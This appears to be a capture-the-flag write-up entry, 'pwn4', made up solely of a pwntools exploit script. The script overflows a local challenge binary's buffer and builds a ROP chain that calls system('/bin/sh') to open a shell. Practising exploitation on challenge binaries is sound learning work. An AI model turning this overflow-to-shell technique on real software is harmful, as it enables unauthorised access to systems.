---
title: "pwn4"
points: N/A
tags: ["pwn"]
---

```python
from pwn import *

binary_name = "./pwn4"
elf = context.binary = ELF(binary_name)
DEBUG = True

if DEBUG:
    p = gdb.debug(binary_name, '''
        break *laas+61
        continue
    ''')
else:
    p = process(binary_name)

rop = ROP(elf)
rop.raw(b'a'*37)
rop.raw(p32(elf.plt['system']))
rop.raw(p32(0xffffffff))
rop.raw(p32(next(elf.search(b'/bin/sh\x00'))))

p.recv()
p.sendline(rop.chain())

p.interactive()
```